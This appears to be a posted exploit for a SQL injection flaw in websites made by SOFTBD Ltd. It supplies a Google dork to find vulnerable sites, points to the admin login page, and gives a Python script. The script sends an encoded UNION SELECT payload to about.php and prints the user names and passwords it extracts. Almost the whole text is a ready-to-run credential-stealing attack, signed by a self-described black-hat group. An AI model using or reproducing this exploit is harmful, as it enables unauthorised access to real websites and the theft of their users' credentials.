############################################################## 
# Exploit Title: Design & Developed by : SOFTBD Ltd. SQL Injection Vul 
# Google Dork 1: intext:Design & Developed by : SOFTBD Ltd. inurl:/about.php?id=
# Google Dork 2: Use Your Brain  
# Date: 10.4.2019 
# Exploit Author: mr.Gh0st N@0b 
# Vendor Homepage: http://www.soft-bd.com/ 
# Tested on: Window 10 /Kali Linux
################################################################ 
#POC and Vul
#Dorking at Google 
#Open a new tab 
#eg. site/about.php?id={base64} 
#/about.php?id=TkktMDAwMDM= <==== {inject}

#Admin Panel
#site/login_slide.php
######################################################
#Python Exploiter and Proof https://i.imgur.com/G3jkuvX.png

#!/usr/bin/env python
#-*- coding: utf-8 -*-
import urllib2
import re
print('''\033[1;33m       [ Author : Myanmar Noob Hackers Team ]
				{Usage:
				 Target : www.example.com}
''')

site = raw_input("\033[1;32m\n Target: ")
site = site.replace('https://', '')
site = site.replace('http://', '')
tar_list = site.split('/')
for tar in tar_list:
    if tar == '':
        tar_list.remove(tar)
site = '/'.join(tar_list)
site = 'http://' + site
url = urllib2.urlopen( str(site) +"/about.php?id=LU5JLTAwMDAzJyAgLyohNTAwMDBVbklvTiovIC8qITUwMDAwU2VMZUN0Ki8gMSwyLDMsLyohNTAwMDBHcm91cF9jb25DYXQoLyohMHg1NTczNjU3MjUwNjE3MzczN2UsVEJMMTFfVVNFUl9OQU1FLDB4M2EsVEJMMTFfVVNFUl9QQVNTLDB4M2M2MjcyM2UqLyksNSw2LDcsOCw5LDEwLDExIGYvKiFmcm9NKi8gY29yZV91c2VyX2luZm8tLSAr").read()
source = re.findall("UserPass~(.*?)<br>",url)[0]
print('''\033[1;31m Found : %s'''%source)
##################################################### 
# mr.Gh0st N@0b 
# Myanmar Noob Hackers 
# Greetz to All Myanmar Black Hats 
# https://www.facebook.com/official.myanmar.noob.hackers/ 
#####################################################
